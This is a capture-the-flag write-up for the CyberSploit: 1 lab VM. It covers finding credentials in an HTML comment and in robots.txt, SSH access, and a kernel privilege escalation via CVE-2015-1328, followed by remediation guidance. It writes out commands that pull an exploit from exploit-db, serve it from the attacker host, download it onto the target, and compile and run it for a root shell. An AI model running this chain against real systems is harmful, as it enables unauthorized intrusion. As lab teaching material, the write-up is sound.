# CyberSploit: 1 — Writeup

> A box that hides its secrets in plain sight: one is a comment in the HTML, another is sitting right there in `robots.txt`, and the last one is a kernel that never got updated. ¯\_(ツ)_/¯
>
> Easy difficulty. Great for beginners. Three steps to root, and every clue is handed to you — you just have to know where to look. ( ͡° ͜ʖ ͡°)

---

| Field | Value |
|-------|-------|
| **Level** | Easy |
| **Target VM** | CyberSploit: 1 (Linux) |
| **Attacker VM** | Kali Linux 2023+ |
| **VulnHub URL** | https://www.vulnhub.com/entry/cybersploit-1,506/ |
| **Techniques** | Web enumeration, HTML comment credential leak, robots.txt enumeration, base64 decode, SSH login with discovered credentials, local kernel privilege escalation |
| **CVEs** | CVE-2015-1328 (Linux overlayfs local privilege escalation, kernel 3.13.0) |
| **APT Groups** | APT28 (kernel exploit usage post-initial-access), generic opportunistic actors targeting unpatched Linux systems |

---

## Attack Summary

```
[nmap] ports 22, 80
    |
    v
[curl /robots.txt] base64-encoded password string + Flag 1
    |
    v
[view-source:/] HTML comment: "username: itsskv"
    |
    v
[base64 -d] decode password
    |
    v
[ssh itsskv@TARGET] initial access
    |
    v
[cat flag2.txt] binary-encoded Flag 2 -> decode with CyberChef (From Binary)
    |
    v
[uname -r] kernel 3.13.0-32-generic (CVE-2015-1328)
    |
    v
[gcc 37292.c -o overlayfs && ./overlayfs] root shell
    |
    v
[cat /root/flag.txt] DONE
```

---

## Methodology

1. Host discovery (netdiscover)
2. Port scan and service fingerprinting (nmap)
3. Web enumeration: HTML source, robots.txt, directory brute-force
4. Credential decoding (base64)
5. Initial access via SSH
6. Kernel version check and CVE identification
7. Exploit compilation and privilege escalation (CVE-2015-1328, EDB-37292)

---

## Step 1: Host Discovery

The target is assigned by DHCP, so start by discovering it on the local network segment:

```bash
netdiscover -r 192.168.1.0/24
```

Expected output (trimmed):

```
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 192.168.1.x   08:00:27:xx:xx:xx      1      60  PCS Systemtechnik GmbH
```

Note the IP address of the VirtualBox adapter. Set it as your target variable:

```bash
export TARGET=192.168.1.x
```

> **MITRE TTP:** T1595.001 — Active Scanning: Scanning IP Blocks

---

## Step 2: Port Scan

Run a full service scan against the target:

```bash
nmap -sV -sC -p- $TARGET
```

Key open ports:

| Port | Service |
|------|---------|
| 22   | OpenSSH |
| 80   | Apache HTTP |

Only two attack surfaces: SSH and HTTP. Let's check the web server first.

> **MITRE TTP:** T1595.002 — Active Scanning: Vulnerability Scanning

> **Alternative:** `rustscan -a $TARGET -- -sV -sC` for a faster initial sweep.

---

## Step 3: Web Enumeration

### HTML source — username in a comment

Browse to `http://$TARGET/` and view the page source (Ctrl+U in most browsers):

```bash
curl -s http://$TARGET/ | grep -i "<!--"
```

Inside you will find:

```html
<!-- username: itsskv -->
```

There it is. The developer left the SSH username directly in the page HTML. ( •_•)

> **MITRE TTP:** T1589.003 — Gather Victim Identity Information: Employee Names

### robots.txt — base64 password

Fetch `robots.txt`:

```bash
curl http://$TARGET/robots.txt
```

The `Disallow` field contains a base64 string. Something like:

```
Disallow: Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
```

Decode it:

```bash
echo "Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=" | base64 -d
```

The decoded output is the password AND Flag 1 in the same string.

> **Real-world note:** Placing secrets in `robots.txt` is surprisingly common. The file is publicly readable, cached by web crawlers, and indexed by tools like Shodan and Wayback Machine. Attackers routinely fetch it as one of their first recon steps.

> **MITRE TTP:** T1552.001 — Credentials in Files; T1083 — File and Directory Discovery

### Directory brute-force

While you have the credentials, also run a quick directory scan to note anything else of interest:

```bash
gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirb/common.txt -q
```

Nothing critical found for exploitation in this box, but always enumerate thoroughly. Paranoia is a skill.

> **Alternative:** `feroxbuster -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/common.txt` gives recursive results.

---

## Step 4: Initial Access via SSH

You now have the username from the HTML comment and the password from the decoded `robots.txt` entry. Log in:

```bash
ssh itsskv@$TARGET
# Password: <decoded base64 value>
```

Expected output:

```
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic x86_64)
itsskv@cybersploit-CTF:~$
```

You're in. ( ˘ ³˘)♥

Read the second flag:

```bash
cat flag2.txt
```

The content is binary-encoded text: groups of 0s and 1s representing ASCII values. Decode it with CyberChef (From Binary operation) at `https://gchq.github.io/CyberChef/`, or on the command line:

```bash
# On your attacker machine — paste the binary string and decode
python3 -c "
binary = 'paste the 0s and 1s here'
chars = [chr(int(b, 2)) for b in binary.split()]
print(''.join(chars))
"
```

> **MITRE TTP:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Step 5: Privilege Escalation — CVE-2015-1328

Check the kernel version:

```bash
uname -r
# 3.13.0-32-generic
```

Kernel `3.13.0-32-generic` is vulnerable to CVE-2015-1328, a local privilege escalation in the overlayfs filesystem implementation. When `FS_USERNS_MOUNT` is enabled (which it is here), an unprivileged user can mount an overlayfs with a crafted directory structure and escalate to root. The public exploit is EDB-37292.

**On the attacker machine:** Download and serve the exploit source:

```bash
wget https://www.exploit-db.com/raw/37292 -O /tmp/37292.c
python3 -m http.server 8080
```

**On the target machine:** Download, compile, and run:

```bash
cd /tmp
wget http://$LHOST:8080/37292.c -O 37292.c
gcc 37292.c -o overlayfs
chmod +x overlayfs
./overlayfs
```

Expected output:

```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root)
```

Root shell. Bingo!! (☞ﾟヮﾟ)☞

> **MITRE TTP:** T1068 — Exploitation for Privilege Escalation; T1105 — Ingress Tool Transfer

> **Real-world note:** CVE-2015-1328 is nearly a decade old, yet systems running Ubuntu 12.04/14.04 with this kernel are still found in legacy environments, embedded systems, and cloud instances that have never been updated. APT28 and several ransomware groups have used kernel LPE exploits in this family as part of post-compromise privilege escalation.

> **Alternative:** `linux-exploit-suggester` (`./linux-exploit-suggester.sh`) or `LES` will identify this CVE automatically from the `uname -r` output.

---

## Step 6: Root Flag

```bash
cat /root/flag.txt
```

Done. ᕕ( ᐛ )ᕗ

---

## Captured Flags / Hashes / Creds

| Item | Value |
|------|-------|
| SSH username | `itsskv` (HTML comment) |
| SSH password / Flag 1 | `cybersploit{...}` (base64 decoded from robots.txt) |
| Flag 2 | Binary-encoded (decode with CyberChef From Binary) |
| Root flag | `/root/flag.txt` |
| CVE exploited | CVE-2015-1328 (EDB-37292, overlayfs LPE) |

---

## Lessons Learned

1. **Credentials in HTML comments** are trivially discovered by any attacker with `curl` or a browser. Nothing you put in the HTML source is private.

2. **`robots.txt` is not a secret vault.** It is publicly readable, indexed by search engines and security tools, and read by attackers as one of the very first recon steps. Never store credentials, tokens, or path hints there.

3. **Base64 is encoding, not encryption.** A base64 string in any public-facing file offers zero confidentiality. It takes one command to decode.

4. **Unpatched kernels from 2015 running in 2024+** are not just a lab scenario. Legacy systems, embedded devices, and long-running cloud VMs frequently run kernels with known critical LPE vulnerabilities.

5. **Layered credential discovery** (HTML comment for username, robots.txt for password) means even "split secrets" can be reconstructed trivially when both pieces are publicly accessible.

**Real-World Relevance:** This pattern (credentials in HTML comments, robots.txt hints, unpatched kernel) matches exactly the kind of low-hanging fruit that automated scanners and initial access brokers exploit to compromise systems at scale. CyberSploit: 1 is a realistic snapshot of what a neglected internal Linux server looks like from the attacker's perspective.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Tool |
|--------|-----------|-----|------|
| Reconnaissance | Active Scanning: Scanning IP Blocks | T1595.001 | netdiscover |
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 | nmap |
| Reconnaissance | Gather Victim Identity Information: Employee Names | T1589.003 | curl/browser |
| Credential Access | Credentials in Files | T1552.001 | curl /robots.txt |
| Credential Access | Unsecured Credentials | T1552 | HTML comment |
| Initial Access | Valid Accounts | T1078 | SSH |
| Lateral Movement | Remote Services: SSH | T1021.004 | ssh |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | CVE-2015-1328 |
| Command and Control | Ingress Tool Transfer | T1105 | python3 http.server |
| Discovery | File and Directory Discovery | T1083 | gobuster |

---

## Remediation

### NIST CSF 2.0

| Function | Control | Action |
|----------|---------|--------|
| Identify (ID.AM) | Asset inventory | Identify all Linux systems running kernels older than 4.x |
| Protect (PR.DS) | Data security | Remove all credentials and hints from HTML source and robots.txt |
| Protect (PR.IP) | Protective technology | Enforce kernel patching policy; minimum supported kernel version |
| Detect (DE.CM) | Continuous monitoring | Alert on exploit compilation in /tmp; alert on overlayfs mount events |
| Recover (RC.RP) | Recovery planning | Define patch SLAs for critical kernel CVEs |

### NIST SP 800-53 Rev. 5

| Control | Description |
|---------|-------------|
| SI-2 | Flaw Remediation: patch kernel to supported version (4.x+); apply Ubuntu security updates |
| IA-5 | Authenticator Management: remove credentials from HTML and robots.txt; use a secrets manager |
| CM-6 | Configuration Settings: disable user namespace mounts if not required (`sysctl kernel.unprivileged_userns_clone=0`) |
| AU-12 | Audit Record Generation: enable auditd to log mount events and file execution in /tmp |

### CISA KEV

CVE-2015-1328 is not currently in the CISA KEV catalog (it predates the catalog's initial scope for most versions), but Ubuntu 12.04 and 14.04 have been end-of-life for years. Systems running these versions should be considered fully compromised by any attacker with local access.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Gap |
|--------|----------|-----|
| Asset, Change, and Configuration Management (ASSET) | MIL-1 | No tracking of end-of-life OS versions in asset inventory |
| Threat and Vulnerability Management (THREAT) | MIL-1 | Kernel CVEs not identified or prioritized for patching |
| Situational Awareness (SA) | MIL-1 | No monitoring for exploit compilation or abnormal mount events |

### MITRE D3FEND

| D3FEND Technique | ID | Addresses |
|------------------|----|-----------|
| Software Update | D3-SU | Patch kernel past CVE-2015-1328 |
| Application Configuration Hardening | D3-ACH | Disable unprivileged user namespaces: `kernel.unprivileged_userns_clone=0` |
| File System Access Pattern Analysis | D3-FSAPA | Alert on overlayfs mount operations by non-root users |
| Executable Allowlisting | D3-EAL | Restrict execution of compiled binaries in /tmp with noexec mount option |
| Credential Hardening | D3-CH | Remove credentials from client-side code and public-facing configuration files |

---

## Final Thoughts

CyberSploit: 1 earns its "easy" rating, but do not let that fool you into skipping it. Every technique here shows up constantly in real engagements: credentials in HTML, base64-encoded values in robots.txt, and an ancient kernel that nobody bothered to patch. The box is a checklist of the most common low-effort wins in pentesting.

Props to the creator for building a box where the entire attack path is discoverable with nothing more than `curl` and `nmap`. Sometimes the simplest lessons are the most important.

Thanks guys!! (❍ᴥ❍ʋ)
